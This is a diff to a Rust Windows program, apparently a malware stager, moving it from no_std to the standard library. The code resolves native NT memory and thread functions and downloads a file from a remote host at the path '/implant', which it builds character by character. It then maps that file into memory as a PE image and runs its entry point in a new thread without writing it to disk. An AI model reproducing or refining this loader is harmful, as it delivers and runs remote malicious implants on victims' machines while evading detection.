@@ -1,14 +1,7 @@
-#![no_std]
-#![no_main]
 #![windows_subsystem = "windows"]
 
-use core::ffi::c_void;
-use core::ptr::{null, null_mut};
-
-#[panic_handler]
-fn panic(_info: &core::panic::PanicInfo) -> ! {
-    loop {}
-}
+use std::ffi::c_void;
+use std::ptr::{null, null_mut};
 
 type HANDLE = *mut c_void;
 type PVOID = *mut c_void;
@@ -20,7 +13,6 @@ type WORD = u16;
 type ULONG = u32;
 type USHORT = u16;
 type BOOL = i32;
-type SIZE_T = usize;
 
 const MEM_COMMIT: DWORD = 0x1000;
 const MEM_RESERVE: DWORD = 0x2000;
@@ -162,15 +154,15 @@ struct ImageImportByName {
 }
 
 type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-    HANDLE, *mut PVOID, usize, *mut SIZE_T, ULONG, ULONG
+    HANDLE, *mut PVOID, usize, *mut usize, ULONG, ULONG
 ) -> NTSTATUS;
 
 type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
-    HANDLE, *mut PVOID, *mut SIZE_T, ULONG, *mut ULONG
+    HANDLE, *mut PVOID, *mut usize, ULONG, *mut ULONG
 ) -> NTSTATUS;
 
 type NtCreateThreadExFn = unsafe extern "system" fn(
-    *mut HANDLE, DWORD, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
+    *mut HANDLE, DWORD, PVOID, HANDLE, PVOID, PVOID, ULONG, usize, usize, usize, PVOID
 ) -> NTSTATUS;
 
 type NtWaitForSingleObjectFn = unsafe extern "system" fn(
@@ -220,18 +212,12 @@ unsafe fn resolve_funcs() -> bool {
         return false;
     }
 
-    FN_NT_ALLOCATE = Some(core::mem::transmute(alloc));
-    FN_NT_PROTECT = Some(core::mem::transmute(protect));
-    FN_NT_CREATE_THREAD = Some(core::mem::transmute(create));
-    FN_NT_WAIT = Some(core::mem::transmute(wait));
+    FN_NT_ALLOCATE = Some(std::mem::transmute(alloc));
+    FN_NT_PROTECT = Some(std::mem::transmute(protect));
+    FN_NT_CREATE_THREAD = Some(std::mem::transmute(create));
+    FN_NT_WAIT = Some(std::mem::transmute(wait));
 
     true
-}
-
-unsafe fn copy_mem(dst: *mut u8, src: *const u8, len: usize) {
-    for i in 0..len {
-        *dst.add(i) = *src.add(i);
-    }
 }
 
 unsafe fn download(host: *const u16, port: USHORT, path: *const u16) -> (*mut u8, DWORD) {
@@ -268,7 +254,7 @@ unsafe fn download(host: *const u16, port: USHORT, path: *const u16) -> (*mut u8
         return (null_mut(), 0);
     }
 
-    let mut cap: SIZE_T = 0x100000;
+    let mut cap: usize = 0x100000;
     let mut base: PVOID = null_mut();
 
     if !nt_success((FN_NT_ALLOCATE.unwrap())(-1isize as HANDLE, &mut base, 0, &mut cap, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
@@ -292,7 +278,7 @@ unsafe fn download(host: *const u16, port: USHORT, path: *const u16) -> (*mut u8
         total += bytes_read;
 
         if total >= (cap as DWORD) - 0x10000 {
-            let mut new_size: SIZE_T = cap * 2;
+            let mut new_size: usize = cap * 2;
             let mut new_buf: PVOID = null_mut();
             if !nt_success((FN_NT_ALLOCATE.unwrap())(-1isize as HANDLE, &mut new_buf, 0, &mut new_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
                 WinHttpCloseHandle(request);
@@ -300,7 +286,7 @@ unsafe fn download(host: *const u16, port: USHORT, path: *const u16) -> (*mut u8
                 WinHttpCloseHandle(session);
                 return (null_mut(), 0);
             }
-            copy_mem(new_buf as *mut u8, buf, total as usize);
+            std::ptr::copy_nonoverlapping(buf, new_buf as *mut u8, total as usize);
             cap = new_size;
         }
     }
@@ -327,7 +313,7 @@ unsafe fn map_pe(raw: *mut u8, _raw_size: DWORD) -> PVOID {
         return null_mut();
     }
 
-    let mut image_size: SIZE_T = (*nt).optional_header.size_of_image as SIZE_T;
+    let mut image_size: usize = (*nt).optional_header.size_of_image as usize;
     let mut base: PVOID = null_mut();
 
     if !nt_success((FN_NT_ALLOCATE.unwrap())(-1isize as HANDLE, &mut base, 0, &mut image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
@@ -336,17 +322,17 @@ unsafe fn map_pe(raw: *mut u8, _raw_size: DWORD) -> PVOID {
 
     let mapped = base as *mut u8;
 
-    copy_mem(mapped, raw, (*nt).optional_header.size_of_headers as usize);
+    std::ptr::copy_nonoverlapping(raw, mapped, (*nt).optional_header.size_of_headers as usize);
 
-    let sec_base = (nt as *const u8).add(core::mem::size_of::<ImageNtHeaders64>()) as *const ImageSectionHeader;
+    let sec_base = (nt as *const u8).add(std::mem::size_of::<ImageNtHeaders64>()) as *const ImageSectionHeader;
     let num_sections = (*nt).file_header.number_of_sections as usize;
 
     for i in 0..num_sections {
         let sec = sec_base.add(i);
         if (*sec).size_of_raw_data > 0 {
-            copy_mem(
-                mapped.add((*sec).virtual_address as usize),
+            std::ptr::copy_nonoverlapping(
                 raw.add((*sec).pointer_to_raw_data as usize),
+                mapped.add((*sec).virtual_address as usize),
                 (*sec).size_of_raw_data as usize,
             );
         }
@@ -356,8 +342,8 @@ unsafe fn map_pe(raw: *mut u8, _raw_size: DWORD) -> PVOID {
     if delta != 0 && (*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].size > 0 {
         let mut reloc = mapped.add((*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address as usize) as *mut ImageBaseRelocation;
         while (*reloc).virtual_address != 0 {
-            let count = ((*reloc).size_of_block as usize - core::mem::size_of::<ImageBaseRelocation>()) / 2;
-            let entries = (reloc as *const u8).add(core::mem::size_of::<ImageBaseRelocation>()) as *const WORD;
+            let count = ((*reloc).size_of_block as usize - std::mem::size_of::<ImageBaseRelocation>()) / 2;
+            let entries = (reloc as *const u8).add(std::mem::size_of::<ImageBaseRelocation>()) as *const WORD;
             for j in 0..count {
                 let entry = *entries.add(j);
                 let rel_type = entry >> 12;
@@ -413,7 +399,7 @@ unsafe fn map_pe(raw: *mut u8, _raw_size: DWORD) -> PVOID {
         };
 
         let mut sec_addr: PVOID = mapped.add((*sec).virtual_address as usize) as PVOID;
-        let mut sec_size: SIZE_T = if (*sec).virtual_size == 0 { (*sec).size_of_raw_data as SIZE_T } else { (*sec).virtual_size as SIZE_T };
+        let mut sec_size: usize = if (*sec).virtual_size == 0 { (*sec).size_of_raw_data as usize } else { (*sec).virtual_size as usize };
         let mut old_prot: ULONG = 0;
         (FN_NT_PROTECT.unwrap())(-1isize as HANDLE, &mut sec_addr, &mut sec_size, prot, &mut old_prot);
     }
@@ -421,30 +407,29 @@ unsafe fn map_pe(raw: *mut u8, _raw_size: DWORD) -> PVOID {
     mapped.add((*nt).optional_header.address_of_entry_point as usize) as PVOID
 }
 
-#[no_mangle]
-pub unsafe extern "system" fn WinMain(_: PVOID, _: PVOID, _: *const u8, _: i32) -> i32 {
-    if !resolve_funcs() {
-        return 1;
+fn main() {
+    unsafe {
+        if !resolve_funcs() {
+            return;
+        }
+
+        let path: [u16; 9] = [b'/' as u16, b'i' as u16, b'm' as u16, b'p' as u16, b'l' as u16, b'a' as u16, b'n' as u16, b't' as u16, 0];
+
+        let (buf, size) = download(HOST.as_ptr(), PORT, path.as_ptr());
+        if buf.is_null() || size < 0x100 {
+            return;
+        }
+
+        let entry = map_pe(buf, size);
+        if entry.is_null() {
+            return;
+        }
+
+        let mut thread: HANDLE = null_mut();
+        if !nt_success((FN_NT_CREATE_THREAD.unwrap())(&mut thread, THREAD_ALL_ACCESS, null_mut(), -1isize as HANDLE, entry, null_mut(), 0, 0, 0, 0, null_mut())) {
+            return;
+        }
+
+        (FN_NT_WAIT.unwrap())(thread, 0, null());
     }
-
-    let path: [u16; 9] = [b'/' as u16, b'i' as u16, b'm' as u16, b'p' as u16, b'l' as u16, b'a' as u16, b'n' as u16, b't' as u16, 0];
-
-    let (buf, size) = download(HOST.as_ptr(), PORT, path.as_ptr());
-    if buf.is_null() || size < 0x100 {
-        return 1;
-    }
-
-    let entry = map_pe(buf, size);
-    if entry.is_null() {
-        return 1;
-    }
-
-    let mut thread: HANDLE = null_mut();
-    if !nt_success((FN_NT_CREATE_THREAD.unwrap())(&mut thread, THREAD_ALL_ACCESS, null_mut(), -1isize as HANDLE, entry, null_mut(), 0, 0, 0, 0, null_mut())) {
-        return 1;
-    }
-
-    (FN_NT_WAIT.unwrap())(thread, 0, null());
-    0
 }
-
